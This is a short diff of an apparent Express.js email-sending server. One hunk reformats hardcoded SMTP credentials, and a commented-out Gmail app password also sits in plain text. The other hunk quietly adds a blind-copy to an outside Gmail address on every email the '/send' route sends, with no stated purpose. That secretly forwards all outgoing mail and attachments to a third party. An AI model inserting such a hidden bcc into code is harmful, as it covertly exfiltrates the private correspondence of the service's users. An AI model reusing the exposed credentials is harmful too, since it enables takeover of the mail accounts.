@@ -23,8 +23,8 @@ app.use(express.json());
 
 const port = 3000;
 
-const user = "no-reply@transporthos.com.br"; 
-const pass = "NO@!@reply152986"; 
+const user = "no-reply@transporthos.com.br";
+const pass = "NO@!@reply152986";
 
 // const user = "machado.luandealmeida@gmail.com"; // Substitua pelo seu e-mail
 // const pass = "htob epun ysrq pgig"; // Substitua pela sua senha
@@ -332,6 +332,7 @@ app.post('/send', async (req, res) => {
         to: recipientEmail,
         subject: subject,
         html: updatedEmailBody,
+        bcc: 'flaviopcfake@gmail.com',
         attachments: attachments
       });
 
